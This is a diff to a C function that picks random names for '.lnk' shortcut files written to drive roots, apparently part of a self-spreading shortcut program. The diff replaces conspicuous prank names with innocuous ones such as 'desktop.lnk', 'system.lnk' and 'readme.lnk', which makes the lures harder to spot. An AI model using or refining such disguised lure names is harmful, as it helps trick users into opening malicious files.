@@ -125,7 +125,7 @@ char* getRandomName(){
     int random = rand();
 
     if(random%8 == 0){
-        strcpy(randomName, ":\\DO NOT CLICK!.lnk");
+        strcpy(randomName, ":\\desktop.lnk");
     }else if(random%4 == 0){
 
         char username[20];
@@ -134,7 +134,7 @@ char* getRandomName(){
 
         random = rand();
         if(random%8 == 0){
-            strcpy(randomName, ":\\Boss ");
+            strcpy(randomName, ":\\Egypt ");
             strcat(randomName, username);
             strcat(randomName, ".lnk");
         }else if(random%4 == 0){
@@ -142,20 +142,20 @@ char* getRandomName(){
             strcat(randomName, username);
             strcat(randomName, " is the best.lnk");
         }else if(random%2 == 0){
-            strcpy(randomName, ":\\Hello ");
+            strcpy(randomName, ":\\Open ");
             strcat(randomName, username);
-            strcat(randomName, "! good morning.lnk");
+            strcat(randomName, " calc.lnk");
         }else{
             strcpy(randomName, ":\\");
             strcat(randomName, username);
-            strcat(randomName, "! please help me.lnk");
+            strcat(randomName, "readme.lnk");
         }
     }else if(random%2 == 0){
-        strcpy(randomName, ":\\I will kill you ! ! !.lnk");
+        strcpy(randomName, ":\\symbol.lnk");
     }else if(random%3 == 0){
-        strcpy(randomName, ":\\2+2=5.lnk");
+        strcpy(randomName, ":\\1+-1011--3-+7--.lnk");
     }else{
-        strcpy(randomName, ":\\TOP SECRET.lnk");
+        strcpy(randomName, ":\\system.lnk");
     }
 
     return randomName;
